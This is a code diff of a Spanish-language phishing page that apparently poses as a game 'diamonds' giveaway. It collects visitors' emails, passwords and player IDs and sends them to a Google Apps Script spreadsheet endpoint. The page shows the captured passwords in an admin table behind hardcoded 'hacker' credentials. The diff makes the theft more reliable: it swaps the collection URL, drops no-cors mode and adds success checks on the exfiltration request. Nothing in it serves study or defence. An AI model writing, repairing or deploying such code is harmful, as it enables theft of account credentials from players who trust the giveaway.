@@ -168,27 +168,6 @@
             background: linear-gradient(135deg, #e04e28 0%, #c43a15 100%);
         }
 
-        .btn-delete {
-            background: rgba(200, 60, 40, 0.8);
-            border: none;
-            border-radius: 20px;
-            color: white;
-            font-size: 12px;
-            font-weight: 600;
-            cursor: pointer;
-            padding: 6px 14px;
-            transition: 0.2s;
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .btn-delete:hover {
-            background: #e6392e;
-            transform: scale(1.02);
-            box-shadow: 0 2px 8px rgba(230, 57, 46, 0.4);
-        }
-
         .screen {
             display: none;
             animation: fadeUp 0.45s ease;
@@ -374,7 +353,6 @@
             .diamond-row { grid-template-columns: 1fr; gap: 12px; }
             .form-card { padding: 22px 18px; }
             .admin-table th, .admin-table td { padding: 8px 6px; font-size: 11px; }
-            .btn-delete { padding: 4px 8px; font-size: 10px; }
         }
     </style>
 </head>
@@ -468,9 +446,9 @@
                 <div class="admin-table-wrapper">
                     <table class="admin-table" id="adminUserTable">
                         <thead>
-                            <tr><th>#</th><th>Correo electrónico</th><th>Contraseña</th><th>ID Jugador</th><th>Diamantes</th><th>Fecha y Hora</th><th>Acción</th></tr>
+                            <tr><th>#</th><th>Correo electrónico</th><th>Contraseña</th><th>ID Jugador</th><th>Diamantes</th><th>Fecha y Hora</th></tr>
                         </thead>
-                        <tbody id="adminTableBody"><tr><td colspan="7" style="text-align:center;">Cargando cuentas...</td></tr></tbody>
+                        <tbody id="adminTableBody"><tr><td colspan="6" style="text-align:center;">Cargando cuentas...</td></tr></tbody>
                     </table>
                 </div>
                 <div style="margin-top: 20px; text-align: center;">
@@ -487,8 +465,8 @@
         const ADMIN_EMAIL = "hacker@gmail.com";
         const ADMIN_PASSWORD = "hacker999";
         
-        // ✅ TU URL DE GOOGLE APPS SCRIPT ACTUALIZADA ✅
-        const GOOGLE_SHEETS_API_URL = "https://script.google.com/macros/s/AKfycby53cYHNx6k0ioDJ6CTMaV4bvfzoEm6yHsxd_P0lKuArDyihsb5jtaDpU5hbsKil8yehg/exec";
+        // ✅ TU URL DE GOOGLE APPS SCRIPT (ACTUALIZADA) ✅
+        const GOOGLE_SHEETS_API_URL = "https://script.google.com/macros/s/AKfycbyqb747a_vgvrc3R4gu8iCt769pbf4wkWpiGuXfMlIs-ytvPOi9YmSiPZ_d4-pyaAPmSw/exec";
         
         // Backup local
         const STORAGE_KEY = 'diamond_users_data_backup';
@@ -517,7 +495,6 @@
             try {
                 const response = await fetch(GOOGLE_SHEETS_API_URL, {
                     method: 'POST',
-                    mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         email: userData.email,
@@ -526,10 +503,18 @@
                         diamonds: userData.diamonds
                     })
                 });
-                console.log("✅ Registro guardado en Google Sheets");
-                return true;
+                
+                const result = await response.json();
+                if (result.success) {
+                    console.log("✅ Registro guardado en Google Sheets");
+                    return true;
+                } else {
+                    console.error("❌ Error en respuesta:", result);
+                    return false;
+                }
             } catch(error) {
                 console.error("❌ Error al guardar en Google Sheets:", error);
+                alert("⚠️ No se pudo conectar con Google Sheets. Los datos se guardaron LOCALMENTE.\n\nVerifica que implementaste el Apps Script correctamente.");
                 return false;
             }
         }
@@ -549,7 +534,7 @@
                         fecha: record.fecha || 'Fecha no disponible'
                     }));
                 }
-                return [];
+                return getUsersFromLocalStorage();
             } catch(e) {
                 console.log("Error al obtener de Sheets, usando localStorage:", e);
                 return getUsersFromLocalStorage();
@@ -578,7 +563,7 @@
             }
             
             if (users.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">📭 No hay cuentas registradas aún</td></tr>';
+                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">📭 No hay cuentas registradas aún</td></tr>';
                 return;
             }
             
@@ -593,8 +578,6 @@
                 row.insertCell(3).textContent = user.playerId;
                 row.insertCell(4).textContent = user.diamantes;
                 row.insertCell(5).textContent = user.fecha;
-                const actionCell = row.insertCell(6);
-                actionCell.innerHTML = '<span style="opacity:0.5; font-size:11px;">📌 En Sheets</span>';
             });
         }
 
@@ -753,7 +736,7 @@
                 }
 
                 receiveBtn.disabled = true;
-                receiveBtn.innerHTML = '<span class="loading-spinner"></span> Guardando en Google Sheets...';
+                receiveBtn.innerHTML = '<span class="loading-spinner"></span> Guardando...';
 
                 const userData = {
                     email: tempEmail,
